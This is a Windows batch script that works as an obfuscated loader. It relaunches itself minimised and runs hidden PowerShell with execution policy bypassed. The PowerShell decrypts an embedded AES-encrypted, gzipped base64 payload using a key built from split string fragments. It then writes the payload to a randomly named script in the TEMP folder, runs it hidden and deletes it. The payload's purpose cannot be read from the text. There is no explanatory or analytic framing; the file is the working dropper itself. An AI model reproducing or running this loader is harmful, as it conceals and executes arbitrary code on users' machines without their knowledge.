@echo off
if /i "%~1"=="_bg" goto run
start "" /min "%ComSpec%" /c ""%~f0" _bg"
exit /b
:run
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$l=Get-Content -LiteralPath '%~f0' -Encoding UTF8;$s=-1;$e=-1;for($i=0;$i -lt $l.Count;$i++){if($l[$i]-eq'::x7k9::'){$s=$i+1};if($l[$i]-eq'::x7k9e::'){$e=$i}};if($s -lt 0 -or $e -lt 0){exit 1};$p=($l[$s..($e-1)]-join '').Trim();$r=[Convert]::FromBase64String($p);$iv=$r[0..15];$c=$r[16..($r.Length-1)];$k=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(('Sharp'+'Buy_'+'SB_'+'2026'+'_xK7')));$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$iv;$m=New-Object IO.MemoryStream(,$c);$d=New-Object Security.Cryptography.CryptoStream($m,$a.CreateDecryptor(),[Security.Cryptography.CryptoStreamMode]::Read);$g=New-Object IO.Compression.GZipStream($d,[IO.Compression.CompressionMode]::Decompress);$t=New-Object IO.StreamReader($g);$x=$t.ReadToEnd();$t.Close();$f=$env:TEMP+'\sb_'+[guid]::NewGuid().ToString('n')+'.ps1';[IO.File]::WriteAllText($f,$x,[Text.UTF8Encoding]::new($false));powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $f;$z=$LASTEXITCODE;Remove-Item $f -Force -EA SilentlyContinue;exit $z"
exit /b %ERRORLEVEL%
goto :eof
::x7k9::
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
::x7k9e::
